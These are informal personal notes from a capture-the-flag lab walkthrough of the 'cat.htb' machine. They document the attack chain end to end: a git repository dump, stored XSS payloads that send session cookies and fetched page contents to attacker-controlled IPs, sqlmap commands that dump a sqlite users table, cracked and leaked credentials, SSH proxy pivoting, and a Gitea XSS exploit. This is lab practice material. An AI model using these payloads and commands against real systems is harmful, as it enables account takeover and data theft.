___


port 80 and 22

we do have a php cookie 



is a dir but i get forbidden
http://cat.htb/uploads/



if i sign in contest I can upload files


I can upload a file but where does it go to



*dirsearch clutch* <========

*.git directory has some access*

.git/logs/HEAD found this
0000000000000000000000000000000000000000 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5 Axel <axel2017@gmail.com> 1725146774 +0000	commit (initial): Cat v1



git extractor didn't work but git-dumper worked





its an sqlite database


winners.php might b interesting


*winners.php*
<?php
$reportsDir = 'winners/';
$files = glob($reportsDir . '*.php');
if (!empty($files)) {
    include $files[0];
} else {
    echo "<h1>There are no winners.</h1>";
}
?>

*this include fucks it up*

if i can upload a php file to this path is jover



*need to name it as a.php*


*need somehitn   like this*

        // uploads/1234_filename
        // /uploads/1234_;../winners/file.php

& would work
. would work



*what to do*

need to POST to accept_cat.php as axel 

catName is the var I need for sqlite injection


admin.php page is vulnerable to stored XSS when catName is displayed on page
can steal cookies


<script>fetch('http://10.10.14.24:8888/?c=' + document.cookie)</script>



*this is so nice recursive grep*
grep -Ehair axel




```bash
<img src=x onerror="document.location='http://10.10.14.126/?cookie='+document.cookie" />
```



username is displayed on catview.php without sanitization




*grabbed cookie*
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.11.53 - - [12/Aug/2025 11:30:01] "GET /?c=PHPSESSID=dbnf7tmskggea6g2j22q33ei6d HTTP/1.1" 200 -



# sqlmap is actually goated wtf


*for enum tables*
python3 sqlmap.py -r ~/box/cat/xss/request.txt -p catName --dbms sqlite --level 5 --risk 3 --tables --threads 10 --batch


*dump users table*
python3 sqlmap.py -r ~/box/cat/xss/request.txt -p catName --dbms sqlite --level 5 --risk 3 -T users --threads 10 --batch



* this enums and dumps all tables*
python3 sqlmap.py -r ~/box/cat/xss/request.txt -p catName --dbms sqlite --level 5 --risk 3 --tables --dump --threads 10 --batch 



*this is what I used to dump users table*
python3 sqlmap.py -r ~/box/cat/xss/request.txt -p catName --dbms sqlite --level 5 --risk 3 --tables -T users --dump --threads 10 --batch




*cracked hash here*

rosamendoza485@gmail.com:soyunaprincesarosa


*ssh login*
rosa:soyunaprincesarosa



rosa in (adm) group



sendmail is in the crontab

port 25 smtp running

3000 is what

check those

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
tcp        0      0 127.0.0.1:48317         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:50093         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:43221         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -       



apache is serving files for cat.htb:80 directly from webroot



-rwsr-xr-x 1 root root 15K Mar  7  2020 /usr/sbin/sensible-mda (Unknown SUID binary!)



-rwxr-sr-x 1 root smmsp 849K Mar  7  2020 /usr/lib/sm.bin/sendmail  --->  Sendmail_8.10.1/Sendmail_8.11.x/Linux_Kernel_2.2.x_2.4.0-test1_(SGI_ProPack_1.2/1.3)

-rwxr-sr-x 1 root smmsp 82K Mar  7  2020 /usr/lib/sm.bin/mailstats (Unknown SGID binary)


-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)

/var/mail/root

password: $6$h3rq/d.nMRoIQxyB$NsJGJxB3t6IJrvAKsS09wwuzbUEXvxD1ynte51jd/EHPqnaLLiYU6rXqievpqh0aJNTcDCCI7Xt9i67jTaqFF.



*either*
-exposed ports
-SUID
-this hash

-group and sendmail honerable mentions



*port 25 smtp*
220 cat.htb ESMTP Sendmail 8.15.2/8.15.2/Debian-18; Tue, 12 Aug 2025 17:12:37 GMT; (No UCE/UBE) logging access from: localhost(OK)-localhost [127.0.0.1]




*that hash cracked with wtf*
?:123



*/var/log/apache2/access.log*
127.0.0.1 - - [12/Aug/2025:17:40:28 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"



*info here gitea*
/var/mail/axel




We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.



*need to sendmail to jobert with gitrepo with XSS and steal his session*


he probs has access to administrator project repo




*exploit XSS gitea 1.22*.0

https://www.exploit-db.com/exploits/52077

 <a href="javascript:fetch('http://10.10.14.24:8888/?c=' + document.cookie)"> welcome to my repo</a>



*damn dynamic ssh forwarding is goated can use it to pivot*

opens an ssh SOCKS5 proxy. then edit proxychains.conf add my proxy there
and use proxychains to send traffic from all my programs through it


```bash
ssh -f -N -D 58080 rosa@cat.htb
```
```text
socks5 127.0.0.1 58080
```
```bash
sudo proxychains -q nmap -T4 -Pn -p25,587,3000,37479,38855,47401 -sT -sC -sV -oN proxy-scan.txt 127.0.0.1
```



*got jobert to click but it was empty no cookie got*
*can we read the  page*


fetch("http://localhost:3000/administrator/Employee-management/")
	.then((response) => response.text())
	.then((data) =>
		fetch(
			"http://10.10.14.126/?data=" +
				encodeURIComponent(btoa(unescape(encodeURIComponent(data)))),
		),
	);


```html
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/src/branch/main/index.php").then(response=>response.text()).then(data=>fetch("http://10.10.14.24:8888/?data="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>pwn</a>
```

```bash
sudo rlwrap nc -lnvp 80 > reply.txt
```


*this looks interesting*
    href="/administrator/Employee-management/archive/main.zip"

the readme as well

*this as well*
href="/administrator/Employee-management/commit/7fa272fd5c07320c932584e150717b4829a0d0b3"



  href="/administrator/Employee-management/commit/a8dd0449c9f2702c8600ef686ef5f43dec953ebd"




*in the index.php file*
 	<?php
	$valid_username = 'admin';
	$valid_password = 'IKw75eR0MR7CMIxhH0';
	
	if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) ||
	$_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
	
	header('WWW-Authenticate: Basic realm="Employee Management"');
	header('HTTP/1.0 401 Unauthorized'); 



password works for root but not through ssh 
but works with su


always check if password for a user works through ssh and through su
# might work for one but not for the other!!!!!!


